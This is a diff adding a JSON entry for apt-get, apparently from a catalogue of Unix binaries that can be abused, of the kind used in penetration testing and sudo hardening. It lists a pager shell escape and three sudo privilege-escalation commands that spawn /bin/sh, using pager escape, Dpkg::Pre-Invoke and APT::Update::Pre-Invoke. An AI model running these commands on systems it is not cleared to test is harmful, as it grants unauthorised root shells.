@@ -1,0 +1,24 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "This invokes the default pager, which is likely to be 'less', other functions may apply.",
+        "code": "apt-get changelog apt\n!/bin/sh\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "This invokes the default pager, which is likely to be 'less', other functions may apply.",
+        "code": "sudo apt-get changelog apt\n!/bin/sh\n"
+      },
+      {
+        "description": "For this to work the target package (e.g., 'sl') must not be installed.",
+        "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n"
+      },
+      {
+        "description": "When the shell exits the 'update' command is actually executed.",
+        "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+      }
+    ]
+  }
+}
